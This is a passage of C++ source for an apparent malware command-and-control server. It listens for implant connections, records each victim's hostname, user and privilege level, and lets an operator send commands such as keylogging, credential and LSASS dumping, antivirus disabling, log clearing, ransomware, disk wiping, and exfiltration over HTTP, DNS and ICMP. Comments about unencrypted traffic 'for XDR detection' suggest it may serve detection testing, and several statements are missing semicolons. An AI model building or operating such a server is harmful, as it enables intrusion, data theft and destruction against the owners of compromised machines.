        {"WEBCAM_CAPTURE", CMD_WEBCAM_CAPTURE},
        {"MICROPHONE_RECORD", CMD_MICROPHONE_RECORD},
        {"SCREEN_RECORD", CMD_SCREEN_RECORD},
        {"SHELL_EXEC", CMD_SHELL_EXEC},
        {"POWERSHELL", CMD_POWERSHELL},
        {"INJECT_PROCESS", CMD_INJECT_PROCESS},
        {"LOAD_MODULE", CMD_LOAD_MODULE},
        {"MIGRATE_PROCESS", CMD_MIGRATE_PROCESS},
        {"REVERSE_SHELL", CMD_REVERSE_SHELL},
        {"REMOTE_DESKTOP", CMD_REMOTE_DESKTOP},
        {"INSTALL_SERVICE", CMD_INSTALL_SERVICE},
        {"REGISTRY_PERSIST", CMD_REGISTRY_PERSIST},
        {"SCHEDULED_TASK", CMD_SCHEDULED_TASK},
        {"WMI_PERSIST", CMD_WMI_PERSIST},
        {"STARTUP_FOLDER", CMD_STARTUP_FOLDER},
        {"BOOTKIT_INSTALL", CMD_BOOTKIT_INSTALL},
        {"PORT_SCAN", CMD_PORT_SCAN},
        {"SMB_SCAN", CMD_SMB_SCAN},
        {"PSEXEC", CMD_PSEXEC},
        {"WMI_EXEC", CMD_WMI_EXEC},
        {"RDP_EXEC", CMD_RDP_EXEC},
        {"PASS_THE_HASH", CMD_PASS_THE_HASH},
        {"MIMIKATZ", CMD_MIMIKATZ_EXEC},
        {"UAC_BYPASS", CMD_UAC_BYPASS},
        {"TOKEN_STEAL", CMD_TOKEN_STEAL},
        {"EXPLOIT_SUGGESTER", CMD_EXPLOIT_SUGGESTER},
        {"LSASS_DUMP", CMD_LSASS_DUMP},
        {"SAM_DUMP", CMD_SAM_DUMP},
        {"DISABLE_AV", CMD_DISABLE_AV},
        {"CLEAR_LOGS", CMD_CLEAR_LOGS},
        {"TIMESTOMP", CMD_TIMESTOMP},
        {"PROCESS_HOLLOW", CMD_PROCESS_HOLLOW},
        {"ROOTKIT_INSTALL", CMD_ROOTKIT_INSTALL},
        {"AMSI_BYPASS", CMD_AMSI_BYPASS},
        {"ETW_DISABLE", CMD_ETW_DISABLE},
        {"STAGE_FILES", CMD_STAGE_FILES},
        {"COMPRESS_DATA", CMD_COMPRESS_DATA},
        {"EXFIL_HTTP", CMD_EXFIL_HTTP},
        {"EXFIL_DNS", CMD_EXFIL_DNS},
        {"EXFIL_ICMP", CMD_EXFIL_ICMP},
        {"EXFIL_EMAIL", CMD_EXFIL_EMAIL},
        {"CLOUD_UPLOAD", CMD_CLOUD_UPLOAD},
        {"RANSOMWARE", CMD_RANSOMWARE},
        {"WIPE_DISK", CMD_WIPE_DISK},
        {"CORRUPT_BOOT", CMD_CORRUPT_BOOT},
        {"CRYPTO_MINER", CMD_CRYPTO_MINER},
        {"TOR_CONNECT", CMD_TOR_CONNECT},
        {"TOR_API_CALL", CMD_TOR_API_CALL},
        {"REVERSE_SSH", CMD_REVERSE_SSH},
        {"NETCAT_TUNNEL", CMD_NETCAT_TUNNEL},
        {"SOCAT_RELAY", CMD_SOCAT_RELAY},
        {"CRYPTCAT_TUNNEL", CMD_CRYPTCAT_TUNNEL}
    };
    
    auto it = cmdMap.find(cmdStr);
    if (it != cmdMap.end()) {
        return it->second;
    }
    return CMD_HEARTBEAT; // Default to heartbeat
}

// Send binary C2 command packet
void sendC2Command(ClientInfo& client, CommandType cmd, const std::string& params = "") {
    C2Packet packet;
    packet.signature = 0xC2E5CA9E;
    packet.version = 0x0200;  // Version 2.0
    packet.flags = 0x0011;    // Encrypted | Compressed (but we send unencrypted)
    packet.sessionId = std::hash<std::string>{}(client.id);
    packet.commandId = cmd;
    packet.sequenceNum = commandSequence++;
    packet.payloadSize = params.length();
    packet.checksum = 0xDEADBEEF;
    
    // Send packet header
    std::string packetData((char*)&packet, sizeof(packet));
    int bytesSent = send(client.socket, packetData.c_str(), packetData.size(), 0);
    
    // Send parameters if any
    if (!params.empty()) {
        send(client.socket, params.c_str(), params.size(), 0);
    }
    
    // Log the command
    std::string cmdName = getCommandName(cmd);
    std::string commandId = "SRV_CMD_" + std::to_string(packet.sequenceNum) + "_" + std::to_string(GetTickCount());
    
    logActivity("CMD_SENT", "[" + commandId + "] " + cmdName + " sent to " + client.hostname + 
                " (" + std::to_string(bytesSent) + " bytes)");
    
    std::cout << "\n\033[1;33m[!] SENDING COMMAND: " << cmdName << " (ID: " << cmd << ") to " 
              << client.hostname << "\033[0m" << std::endl;
}

// C2 command processing (text command wrapper)
void processC2Command(ClientInfo& client, const std::string& command) {
    std::lock_guard<std::mutex> lock(dataMutex);
    
    statisticsData["totalCommands"]++;
    client.executedCommands.push_back(command);
    
    // Parse command and send as binary packet
    std::string cmdStr = command;
    std::string params;
    
    size_t pos = command.find(' ');
    if (pos != std::string::npos) {
        cmdStr = command.substr(0, pos);
        params = command.substr(pos + 1);
    }
    
    CommandType cmdType = parseCommand(cmdStr);
    sendC2Command(client, cmdType, params);
}

// Handle C2 client connection
void handleC2Client(SOCKET clientSocket, sockaddr_in clientAddr) {
    char buffer[4096];
    char clientIP[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
    
    // Generate client ID
    std::string clientId = std::string(clientIP) + ":" + std::to_string(ntohs(clientAddr.sin_port));
    
    // Send UNENCRYPTED handshake to client for XDR detection
    std::string handshake = "WELCOME:ID:" + clientId + "\n";
    send(clientSocket, handshake.c_str(), handshake.length(), 0);
    
    // Create client info
    ClientInfo client;
    client.socket = clientSocket;
    client.id = clientId;
    client.ipAddress = clientIP;
    client.firstSeen = std::chrono::system_clock::now();
    client.lastSeen = client.firstSeen;
    client.isActive = true;
    client.beaconCount = 0;
    
    // Receive initial client info
    int received = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
    if (received > 0) {
        buffer[received] = '\0';
        
        // Parse UNENCRYPTED client info (format: HOSTNAME|USERNAME|OS|PRIVILEGE|GUID)
        std::string clientInfo(buffer, received);
        size_t pos1 = clientInfo.find('|');
        size_t pos2 = clientInfo.find('|', pos1 + 1);
        size_t pos3 = clientInfo.find('|', pos2 + 1);
        size_t pos4 = clientInfo.find('|', pos3 + 1);
        
        if (pos1 != std::string::npos && pos2 != std::string::npos) {
            client.hostname = clientInfo.substr(0, pos1);
            client.username = clientInfo.substr(pos1 + 1, pos2 - pos1 - 1);
            if (pos3 != std::string::npos) {
                client.osVersion = clientInfo.substr(pos2 + 1, pos3 - pos2 - 1);
                if (pos4 != std::string::npos) {
                    std::string privilege = clientInfo.substr(pos3 + 1, pos4 - pos3 - 1);
                    client.isElevated = (privilege == "ADMIN");
                }
            } else {
                client.osVersion = clientInfo.substr(pos2 + 1);
            }
        }
    }
    
    // Add to connected clients
    {
        std::lock_guard<std::mutex> lock(clientsMutex);
        connectedClients[clientId] = client;
        debugLog(DEBUG_INFO, "C2_CLIENT", "Client registered", "Total clients: " + std::to_string(connectedClients.size()));
    }
    
    logActivity("C2", "New client connected: " + client.hostname + " (" + client.ipAddress + ")");
    debugLog(DEBUG_INFO, "C2_CLIENT", "Client fully connected", 
             "Hostname: " + client.hostname + ", User: " + client.username + 
             ", OS: " + client.osVersion + ", Elevated: " + (client.isElevated ? "Yes" : "No"))
    
    // Handle client communication
    while (serverRunning && client.isActive) {
        received = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        if (received <= 0) {
            break;
        }
        
        buffer[received] = '\0';
        
        // Process UNENCRYPTED received data
        std::string data(buffer, received);
        
        // Update last seen
        {
            std::lock_guard<std::mutex> lock(clientsMutex);
            connectedClients[clientId].lastSeen = std::chrono::system_clock::now();
            connectedClients[clientId].beaconCount++;
        }
        
        // Process received data
        if (data.find("BEACON") == 0) {
            // Heartbeat - send UNENCRYPTED ACK
            std::string ack = "ACK";
            send(clientSocket, ack.c_str(), ack.length(), 0);
        }
        else if (data.find("RESULT:") == 0) {
            // Command result
            logActivity("RESULT", client.hostname + ": " + data.substr(7));
            statisticsData["dataTransferred"] += received;
        }
        else if (data.find("FILE:") == 0) {
            // File transfer
            logActivity("FILE", "Received file from " + client.hostname);
            statisticsData["dataTransferred"] += received;
        }
    }
    
    // Remove from connected clients
    {
        std::lock_guard<std::mutex> lock(clientsMutex);
        connectedClients[clientId].isActive = false;
    }
    
    logActivity("C2", "Client disconnected: " + client.hostname);
    closesocket(clientSocket);
}

// C2 server thread
void c2ServerThread() {
    debugLog(DEBUG_INFO, "C2_SERVER", "C2 server thread started");
    
    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        int error = WSAGetLastError();
        logActivity("ERROR", "Failed to create C2 server socket");
        debugLog(DEBUG_ERROR, "C2_SERVER", "Failed to create socket", "WSA Error: " + std::to_string(error));
        return;
    }
    debugLog(DEBUG_VERBOSE, "C2_SERVER", "Socket created successfully")
    
    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(C2_PORT);
    
    if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        int error = WSAGetLastError();
        logActivity("ERROR", "C2 server bind failed on port " + std::to_string(C2_PORT));
        debugLog(DEBUG_ERROR, "C2_SERVER", "Bind failed on port " + std::to_string(C2_PORT), "WSA Error: " + std::to_string(error));
        closesocket(serverSocket);
        return;
    }
    debugLog(DEBUG_INFO, "C2_SERVER", "Successfully bound to port " + std::to_string(C2_PORT))
    
    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
        logActivity("ERROR", "C2 server listen failed");
        closesocket(serverSocket);
        return;
    }
    
    logActivity("C2", "C2 server started on port " + std::to_string(C2_PORT));
    debugLog(DEBUG_INFO, "C2_SERVER", "Listening for client connections on port " + std::to_string(C2_PORT));
    
    while (serverRunning) {
        debugLog(DEBUG_VERBOSE, "C2_SERVER", "Waiting for new connection...")
        sockaddr_in clientAddr{};
        int clientAddrLen = sizeof(clientAddr);
        SOCKET clientSocket = accept(serverSocket, (sockaddr*)&clientAddr, &clientAddrLen);
        
        if (clientSocket != INVALID_SOCKET) {
            char clientIP[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
            debugLog(DEBUG_INFO, "C2_SERVER", "New client connection accepted", "IP: " + std::string(clientIP) + ":" + std::to_string(ntohs(clientAddr.sin_port)));
            
            std::thread clientThread(handleC2Client, clientSocket, clientAddr);
            clientThread.detach();
        } else {
            debugLog(DEBUG_WARNING, "C2_SERVER", "Accept failed", "WSA Error: " + std::to_string(WSAGetLastError()));
        }
    }
    
    closesocket(serverSocket);
}

// Console command handler
void consoleCommandHandler() {
    std::string command;
    
    std::cout << "\n[*] Unified C2 Server Console Ready\n";
    std::cout << "[*] Commands: help, status, list, commands, exec <client_id> <command>, shutdown\n\n";
    
    while (serverRunning) {
        std::cout << "C2> ";
        std::getline(std::cin, command);
        
        if (command == "help") {
            std::cout << "Available commands:\n";
            std::cout << "  help     - Show this help\n";
            std::cout << "  status   - Show server status\n";
            std::cout << "  list     - List connected clients\n";
            std::cout << "  commands - List all available C2 commands\n";
            std::cout << "  exec <client_id> <command> - Execute command on client\n";
            std::cout << "  shutdown - Stop the server\n";
        }
        else if (command == "status") {
            std::lock_guard<std::mutex> lock(clientsMutex);
            std::cout << "Active Clients: " << connectedClients.size() << "\n";
            std::cout << "Total Commands: " << statisticsData["totalCommands"] << "\n";
            std::cout << "Data Transferred: " << statisticsData["dataTransferred"] << " bytes\n";
        }
        else if (command == "list") {
            std::lock_guard<std::mutex> lock(clientsMutex);
            for (const auto& [id, client] : connectedClients) {
                std::cout << "ID: " << id << " - " << client.hostname 
                         << " (" << client.username << "@" << client.ipAddress << ")"
                         << " - " << (client.isActive ? "ACTIVE" : "INACTIVE") << "\n";
            }
        }
        else if (command.find("exec ") == 0) {
            size_t pos = command.find(' ', 5);
            if (pos != std::string::npos) {
                std::string targetId = command.substr(5, pos - 5);
                std::string cmd = command.substr(pos + 1);
                
                std::lock_guard<std::mutex> lock(clientsMutex);
                auto it = connectedClients.find(targetId);
                if (it != connectedClients.end() && it->second.isActive) {
                    processC2Command(it->second, cmd);
                } else {
                    std::cout << "Client not found or inactive\n";
                }
            }
        }
        else if (command == "commands") {
            std::cout << "\nAvailable Commands:\n";
            std::cout << "=================\n";
            std::cout << "\nBasic C2:\n";
            std::cout << "  BEACON, HEARTBEAT\n";
            std::cout << "\nReconnaissance:\n";
            std::cout << "  SYSINFO, PROCESS_LIST, NETWORK_CONFIG, USER_ENUM\n";
            std::cout << "  DOMAIN_INFO, SOFTWARE_ENUM\n";
            std::cout << "\nCollection:\n";
            std::cout << "  SCREENSHOT, KEYLOG_START, KEYLOG_DUMP, CLIPBOARD\n";
            std::cout << "  BROWSER_CREDS, FILE_SEARCH, WEBCAM_CAPTURE\n";
            std::cout << "  MICROPHONE_RECORD, SCREEN_RECORD\n";
            std::cout << "\nExecution:\n";
            std::cout << "  SHELL_EXEC, POWERSHELL, INJECT_PROCESS, LOAD_MODULE\n";
            std::cout << "  MIGRATE_PROCESS, REVERSE_SHELL, REMOTE_DESKTOP\n";
            std::cout << "\nPersistence:\n";
            std::cout << "  INSTALL_SERVICE, REGISTRY_PERSIST, SCHEDULED_TASK\n";
            std::cout << "  WMI_PERSIST, STARTUP_FOLDER, BOOTKIT_INSTALL\n";
            std::cout << "\nLateral Movement:\n";
            std::cout << "  PORT_SCAN, SMB_SCAN, PSEXEC, WMI_EXEC\n";
            std::cout << "  RDP_EXEC, PASS_THE_HASH, MIMIKATZ\n";
            std::cout << "\nPrivilege Escalation:\n";
            std::cout << "  UAC_BYPASS, TOKEN_STEAL, EXPLOIT_SUGGESTER\n";
            std::cout << "  LSASS_DUMP, SAM_DUMP\n";
            std::cout << "\nDefense Evasion:\n";
            std::cout << "  DISABLE_AV, CLEAR_LOGS, TIMESTOMP, PROCESS_HOLLOW\n";
            std::cout << "  ROOTKIT_INSTALL, AMSI_BYPASS, ETW_DISABLE\n";
            std::cout << "\nExfiltration:\n";
            std::cout << "  STAGE_FILES, COMPRESS_DATA, EXFIL_HTTP, EXFIL_DNS\n";
            std::cout << "  EXFIL_ICMP, EXFIL_EMAIL, CLOUD_UPLOAD\n";
            std::cout << "\nImpact:\n";
            std::cout << "  RANSOMWARE, WIPE_DISK, CORRUPT_BOOT, CRYPTO_MINER\n";
            std::cout << "\nAdvanced Network:\n";
            std::cout << "  TOR_CONNECT, TOR_API_CALL, REVERSE_SSH\n";
            std::cout << "  NETCAT_TUNNEL, SOCAT_RELAY, CRYPTCAT_TUNNEL\n";
            std::cout << "\nUsage: exec <client_id> <command>\n";
        }
        else if (command == "shutdown") {
            debugLog(DEBUG_INFO, "CONSOLE", "Shutdown command received");
            serverRunning = false;
            std::cout << "Shutting down server...\n";
            debugLog(DEBUG_INFO, "CONSOLE", "Server shutdown initiated");
            break;
        }
    }
}

// Main function
int main() {
    std::cout << R"(
 _   _       _  __ _          _    ____ ____    ____                           
| | | |_ __ (_)/ _(_) ___  __| |  / ___|___ \  / ___|  ___ _ ____   _____ _ __ 
| | | | '_ \| | |_| |/ _ \/ _` | | |     __) | \___ \ / _ \ '__\ \ / / _ \ '__|
| |_| | | | | |  _| |  __/ (_| | | |___ / __/   ___) |  __/ |   \ V /  __/ |   
 \___/|_| |_|_|_| |_|\___|\__,_|  \____|_____| |____/ \___|_|    \_/ \___|_|   
                                                                                
    )" << std::endl;
    
    std::cout << "[*] Unified C2 Server v" << VERSION << " - All-in-One Solution\n";
    std::cout << "[*] Initializing components...\n\n";
    
    // Initialize debug logging
    if (!initializeDebugLogging()) {
        std::cerr << "[!] Warning: Debug logging initialization failed\n";
    } else {
        std::cout << "[*] Debug logging initialized to: " << DEBUG_LOG_PATH << "\n";
    }
    
    debugLog(DEBUG_INFO, "MAIN", "Server starting", "Version: " + std::string(VERSION));
    
    // Initialize Winsock
    debugLog(DEBUG_VERBOSE, "MAIN", "Initializing Winsock");
    if (!initializeWinsock()) {
        debugLog(DEBUG_ERROR, "MAIN", "Winsock initialization failed");
        return 1;
    }
    debugLog(DEBUG_INFO, "MAIN", "Winsock initialized successfully");
    
    // Start all server components
    std::thread c2Thread(c2ServerThread);
    std::thread webThread(webServerThread);
    std::thread wsThread(webSocketServerThread);
    
    // Wait a moment for servers to start
    std::this_thread::sleep_for(std::chrono::seconds(1));
    
    std::cout << "\n[*] All systems operational!\n";
    std::cout << "[*] C2 Server: Port " << C2_PORT << "\n";
    std::cout << "[*] Web Dashboard: http://localhost:" << WEB_PORT << "\n";
    std::cout << "[*] WebSocket API: ws://localhost:" << WEBSOCKET_PORT << "\n\n";
    
    // Run console command handler
    consoleCommandHandler();
    
    // Wait for threads to finish
    debugLog(DEBUG_INFO, "MAIN", "Waiting for threads to finish");
    if (c2Thread.joinable()) c2Thread.join();
    if (webThread.joinable()) webThread.join();
    if (wsThread.joinable()) wsThread.join();
    
    // Cleanup
    debugLog(DEBUG_INFO, "MAIN", "Cleaning up Winsock");
    WSACleanup();
    
    debugLog(DEBUG_INFO, "MAIN", "Server shutdown complete");
    std::cout << "[*] Server shutdown complete\n";
    
    // Close debug log
    if (g_debugLogFile.is_open()) {
        debugLog(DEBUG_INFO, "MAIN", "Closing debug log file");
        g_debugLogFile.close();
    }
    
    return 0;
}

